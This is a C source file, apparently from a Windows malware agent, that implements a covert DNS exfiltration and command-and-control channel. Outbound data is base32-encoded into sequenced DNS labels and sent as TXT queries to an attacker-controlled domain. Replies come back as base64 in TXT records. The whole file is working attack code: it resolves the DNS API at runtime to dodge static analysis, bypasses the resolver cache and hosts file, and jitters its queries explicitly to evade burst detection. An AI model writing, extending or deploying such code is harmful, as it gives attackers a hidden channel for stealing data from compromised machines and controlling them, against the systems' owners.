/*
 * channel_dns.c — DNS exfiltration channel.
 *
 * Encodes C2 data as DNS queries to an attacker-controlled domain.
 * Receives responses via TXT records.
 *
 * Encoding:
 *   Request (agent → server):
 *     Data is base32-encoded and split into DNS labels (max 63 chars each).
 *     Query: <seq>.<label1>.<label2>.<c2domain>  (TXT query)
 *
 *   Response (server → agent):
 *     TXT record contains base64-encoded encrypted response data.
 *     Multiple TXT records are concatenated in order.
 *
 * Uses dnsapi.dll DnsQuery_W for queries (no raw sockets needed).
 */
#include "agent.h"

/* DNS API imports — resolved at runtime to avoid static linking */
typedef DNS_STATUS (WINAPI *DnsQueryW_t)(PCWSTR, WORD, DWORD, PVOID, PDNS_RECORD*, PVOID);
typedef VOID (WINAPI *DnsRecordListFree_t)(PDNS_RECORD, DNS_FREE_TYPE);

static HMODULE g_hDnsApi = NULL;
static DnsQueryW_t pDnsQuery_W = NULL;
static DnsRecordListFree_t pDnsRecordListFree = NULL;

/* Base32 alphabet (RFC 4648, no padding) */
static const char B32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static int base32_encode(const unsigned char *data, int len, char *out, int out_size) {
    int i = 0, j = 0, bits = 0;
    unsigned long accum = 0;

    for (i = 0; i < len; i++) {
        accum = (accum << 8) | data[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            if (j < out_size - 1)
                out[j++] = B32[(accum >> bits) & 0x1F];
        }
    }
    if (bits > 0) {
        accum <<= (5 - bits);
        if (j < out_size - 1)
            out[j++] = B32[accum & 0x1F];
    }
    out[j] = '\0';
    return j;
}

static int base32_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1;
}

static int base32_decode(const char *in, int in_len, unsigned char *out, int out_size) {
    int bits = 0, j = 0;
    unsigned long accum = 0;

    for (int i = 0; i < in_len; i++) {
        int val = base32_decode_char(in[i]);
        if (val < 0) continue;
        accum = (accum << 5) | val;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            if (j < out_size)
                out[j++] = (unsigned char)((accum >> bits) & 0xFF);
        }
    }
    return j;
}

BOOL dns_init(void) {
    if (CONFIG_DNS_ENABLED != 1) return FALSE;
    if (CONFIG_DNS_DOMAIN[0] == '\0') return FALSE;

    g_hDnsApi = LoadLibraryA("dnsapi.dll");
    if (!g_hDnsApi) return FALSE;

    pDnsQuery_W = (DnsQueryW_t)GetProcAddress(g_hDnsApi, "DnsQuery_W");
    pDnsRecordListFree = (DnsRecordListFree_t)GetProcAddress(g_hDnsApi, "DnsRecordListFree");

    if (!pDnsQuery_W || !pDnsRecordListFree) {
        FreeLibrary(g_hDnsApi);
        g_hDnsApi = NULL;
        return FALSE;
    }

    return TRUE;
}

void dns_cleanup(void) {
    if (g_hDnsApi) {
        FreeLibrary(g_hDnsApi);
        g_hDnsApi = NULL;
    }
    pDnsQuery_W = NULL;
    pDnsRecordListFree = NULL;
}

/*
 * Split base32-encoded data into DNS labels and send as TXT queries.
 * Each query carries one chunk. The server reassembles by sequence number.
 *
 * Query format: <seq_hex>.<label1>.<label2>.<c2domain>
 *   - seq_hex: 2-char hex sequence number (00-FF)
 *   - Each label is max 63 chars of base32 data
 *   - Total domain name max 253 chars
 *
 * Response is collected from TXT records of the LAST query
 * (server buffers and sends response data on the final chunk).
 */

/* Max data per label = 63 chars, max labels = ~3 (reserving space for seq + domain) */
#define DNS_LABEL_MAX     63
#define DNS_LABELS_PER_Q  3
#define DNS_DATA_PER_Q    (DNS_LABEL_MAX * DNS_LABELS_PER_Q)  /* ~189 bytes of b32 */

BOOL dns_send_recv(const unsigned char *packet, DWORD packet_len,
                   unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    if (!pDnsQuery_W) return FALSE;

    /* Base32-encode the entire packet */
    int b32_max = (packet_len * 8 + 4) / 5 + 1;
    char *b32_data = (char *)malloc(b32_max);
    if (!b32_data) return FALSE;

    int b32_len = base32_encode(packet, packet_len, b32_data, b32_max);

    /* Calculate number of chunks needed */
    int chunks = (b32_len + DNS_DATA_PER_Q - 1) / DNS_DATA_PER_Q;
    if (chunks > 255) chunks = 255; /* Max 256 chunks */

    wchar_t wDomain[256];
    MultiByteToWideChar(CP_UTF8, 0, CONFIG_DNS_DOMAIN, -1, wDomain, 256);

    /* Collect TXT responses from the last query */
    Buffer resp_buf;
    buf_init(&resp_buf, 4096);

    BOOL ok = TRUE;
    for (int seq = 0; seq < chunks && ok; seq++) {
        int offset = seq * DNS_DATA_PER_Q;
        int remaining = b32_len - offset;
        int chunk_len = (remaining > DNS_DATA_PER_Q) ? DNS_DATA_PER_Q : remaining;

        /* Build query name: <seq_hex>.<labels>.<c2domain> */
        char query_name[512];
        int qpos = 0;

        /* Sequence number as 2-char hex */
        qpos += snprintf(query_name + qpos, sizeof(query_name) - qpos, "%02x.", seq);

        /* Split chunk into labels of max 63 chars */
        int chunk_offset = 0;
        while (chunk_offset < chunk_len) {
            int label_len = chunk_len - chunk_offset;
            if (label_len > DNS_LABEL_MAX) label_len = DNS_LABEL_MAX;

            memcpy(query_name + qpos, b32_data + offset + chunk_offset, label_len);
            qpos += label_len;
            query_name[qpos++] = '.';
            chunk_offset += label_len;
        }

        /* Append C2 domain */
        snprintf(query_name + qpos, sizeof(query_name) - qpos, "%s", CONFIG_DNS_DOMAIN);

        /* Convert to wide */
        wchar_t wQuery[512];
        MultiByteToWideChar(CP_UTF8, 0, query_name, -1, wQuery, 512);

        /* Send TXT query */
        PDNS_RECORD pRecords = NULL;
        DNS_STATUS status = pDnsQuery_W(
            wQuery,
            DNS_TYPE_TEXT,
            DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
            NULL,
            &pRecords,
            NULL
        );

        if (status != 0 || !pRecords) {
            ok = FALSE;
            break;
        }

        /* Extract TXT record data (only on last chunk or if server responds) */
        PDNS_RECORD pRec = pRecords;
        while (pRec) {
            if (pRec->wType == DNS_TYPE_TEXT) {
                for (DWORD i = 0; i < pRec->Data.TXT.dwStringCount; i++) {
                    wchar_t *wTxt = pRec->Data.TXT.pStringArray[i];
                    /* Convert wide TXT to narrow */
                    char txt_narrow[4096];
                    WideCharToMultiByte(CP_UTF8, 0, wTxt, -1,
                                       txt_narrow, sizeof(txt_narrow), NULL, NULL);

                    /* TXT data is base64-encoded */
                    DWORD decoded_len;
                    unsigned char *decoded = base64_decode(txt_narrow,
                                                           (DWORD)strlen(txt_narrow),
                                                           &decoded_len);
                    if (decoded && decoded_len > 0) {
                        buf_append(&resp_buf, decoded, decoded_len);
                        free(decoded);
                    }
                }
            }
            pRec = pRec->pNext;
        }

        pDnsRecordListFree(pRecords, DnsFreeParsedMessageFields);

        /* Small delay between queries to avoid burst detection */
        if (seq < chunks - 1)
            Sleep(100 + (rand() % 200));
    }

    free(b32_data);

    if (ok && resp_buf.len > 0) {
        *response = resp_buf.data;
        *response_len = resp_buf.len;
        /* Don't free resp_buf.data — caller owns it */
    } else {
        buf_free(&resp_buf);
        ok = FALSE;
    }

    return ok;
}
